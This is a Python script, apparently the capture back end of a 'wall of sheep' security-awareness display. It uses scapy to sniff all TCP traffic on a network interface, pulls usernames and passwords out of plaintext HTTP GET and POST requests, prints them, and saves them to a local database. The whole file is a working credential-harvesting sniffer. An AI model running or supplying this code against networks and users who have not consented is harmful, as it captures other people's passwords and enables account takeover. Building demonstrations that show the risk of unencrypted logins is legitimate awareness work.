#!/usr/bin/env python

from scapy.all import *
import re
import sqlite3

APP = {80: 'HTTP'}

def http_analyze(pcap):
    try:
        temp_load = pcap[TCP][Raw].load
    except:
        return 
   
    header_method = temp_load.split('\r\n')[0]
    if re.match('^GET', header_method):
        method = 'GET'
        content = header_method.split('?')[-1].split(' ')[0]
    elif re.match('^POST', header_method):
        method = 'POST'
        content = temp_load.split('\r\n')[-1]
    else:
        return 

    try:
        data = dict(x.split('=') for x in content.split('&'))
    except:
        return 

    userid = passwd = 'not found'

    for key, value in data.items():
        if re.match('USERID|name|user', key, re.I):
            userid = value
        elif re.match('PASSWD|password|pass', key, re.I):
            passwd = value
    
    if userid != 'not found' and passwd != 'not found':
        if pcap[IP].dport in APP:
            application = APP[pcap[IP].dport]
        else:
            application = pcap[IP].dport
        
        print 'IP:{}:{} {}=> userid = {} & passwd = {}'.format(pcap[IP].dst, application, method, userid, passwd)
    
        conn = sqlite3.connect('../django_wallofsheep/db.sqlite3')
        cursor = conn.cursor()
        cursor.execute('insert into wallofsheep_sheeps_table (account, password, ip, application, method) values (?, ?, ?, ?, ?)', (userid, passwd, pcap[IP].dst, application, method))
        cursor.close()
        conn.commit()
        conn.close()
        
def main():
    nic_id = 'eth0'
    filter_rule = 'tcp'
    prn_func = http_analyze
    sniff(iface = nic_id, filter = filter_rule, prn = prn_func, store=0, count = 0)

if __name__ == '__main__':
    main()
